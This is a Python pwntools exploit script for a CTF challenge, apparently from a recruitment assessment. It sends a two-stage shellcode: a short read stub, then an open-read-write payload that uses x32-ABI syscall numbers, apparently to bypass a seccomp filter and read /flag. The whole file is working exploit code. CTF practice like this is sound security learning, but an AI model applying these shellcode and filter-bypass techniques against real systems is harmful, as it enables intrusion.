#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pwn"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)
context.terminal = [
    os.path.expanduser('~/.local/bin/kitty-gdb'),
    os.path.abspath(binary), 
    str(io.pid)                
    ]
# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/CTF_PWN/PROJECT/山海关招新/预备队pwn考核/ez-shellcode2/glibc/libc.so.6")

# [+] ========== 常用函数定义 ========== [+]
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# [+] ========== 常用泄露函数 ========== [+]
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))

def bug():
  gdb.attach(io)
  pause()

def P():
  pause()

#  [+] ========== Exploit 开始 ========== [+]
def exp():
    short_shellcode = asm(
        """
        xchg rsi,rax;
        mov eax,0x40000000;
        xor edi,edi;
        pop rdx
        syscall
        """
    )
    p("short_shellcode len is ",len(short_shellcode))
    bug()
    sa('ez shellcode 2',short_shellcode)
    
    orw = asm(
        """
        /* open("/flag",0) */
        mov rdx, 0x0067616c662f;
        push rdx;
        push rsp;
        pop rdi;
        xor rsi,rsi;
        xor rdx,rdx;
        mov rax,0x40000002
        syscall
        /* read(3,0x4040B0,0x50)*/
        mov rdi,3;
        mov rsi,0x4040B0;
        mov rdx,0x50;
        mov rax,0x40000000
        syscall
        /* write(0,0x4040B0,0x50)*/
        mov edi,1;    
        mov rax,0x40000001
        syscall
        """
    )
    sleep(3)
    s(b'\x90'*0x10+orw)
    pause()
exp()
itr()
